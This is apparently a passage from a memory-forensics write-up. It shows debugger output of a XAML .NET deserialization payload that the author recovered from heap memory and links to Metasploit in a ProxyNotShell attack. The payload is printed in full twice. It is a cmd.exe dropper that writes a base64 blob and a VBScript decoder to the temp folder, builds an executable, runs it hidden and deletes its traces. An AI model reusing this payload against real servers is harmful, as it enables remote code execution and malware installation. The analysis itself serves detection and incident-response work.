255)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If Not w4 Then _ &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Next &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo base64_decode = strOut &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End Function &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Function mimedecode(byVal strIn) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If Len(strIn) = 0 Then &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo mimedecode = -1 : Exit Function &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Else &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End If &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End Function &gt;&gt;%TEMP%\qrSqg.vbs &amp; cscript //nologo %TEMP%\qrSqg.vbs &amp; del %TEMP%\qrSqg.vbs &amp; del %TEMP%\MgjAb.b64</System:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
</ResourceDictionary>
---------------------------------------
5 matching strings
```

This output shows a XAML file that looks like it's using .NET deserialization to run commands with cmd.exe. It seems more related to Metasploit rather than ProxyNotShell, but we need to do more tests to be sure. This ProxyNotShell attack was carried out through Meterpreter though, but it's epic that we can identify this on the heap.

```
0:000> !Mex.DisplayObj 00000236cbcad640
[raw] 00000236cbcad640 "<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
  <ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
    <ObjectDataProvider.MethodParameters>
      <System:String>cmd.exe</System:String>
      <System:String>/c echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATkIxMAAAAAA2gMFKAQAAAEM6XGxvY2FsMFxhc2ZccmVsZWFzZVxidWlsZC0yLjIuMTRcc3VwcG9ydFxSZWxlYXNlXGFiLnBkYgA=&gt;&gt;%TEMP%\MgjAb.b64 &amp; echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set file = fs.GetFile("%TEMP%\MgjAb.b64") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If file.Size Then &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set fd = fs.OpenTextFile("%TEMP%\MgjAb.b64", 1) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo data = fd.ReadAll &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo data = Replace(data, vbCrLf, "") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo data = base64_decode(data) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo fd.Close &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("%TEMP%\GXBQG.exe", 2, True) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo ofs.Write data &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo ofs.close &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Set shell = CreateObject("Wscript.Shell") &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo shell.run "%TEMP%\GXBQG.exe", 0, false &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Else &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Wscript.Echo "The file is empty." &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End If &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Function base64_decode(byVal strIn) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Dim w1, w2, w3, w4, n, strOut &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo For n = 1 To Len(strIn) Step 4 &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w1 = mimedecode(Mid(strIn, n, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w2 = mimedecode(Mid(strIn, n + 1, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w3 = mimedecode(Mid(strIn, n + 2, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo w4 = mimedecode(Mid(strIn, n + 3, 1)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If Not w2 Then _ &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If  Not w3 Then _ &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If Not w4 Then _ &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Next &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo base64_decode = strOut &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End Function &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Function mimedecode(byVal strIn) &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo If Len(strIn) = 0 Then &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo mimedecode = -1 : Exit Function &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo Else &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End If &gt;&gt;%TEMP%\qrSqg.vbs &amp; echo End Function &gt;&gt;%TEMP%\qrSqg.vbs &amp; cscript //nologo %TEMP%\qrSqg.vbs &amp; del %TEMP%\qrSqg.vbs &amp; del %TEMP%\MgjAb.b64</System:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
</ResourceDictionary>"
```
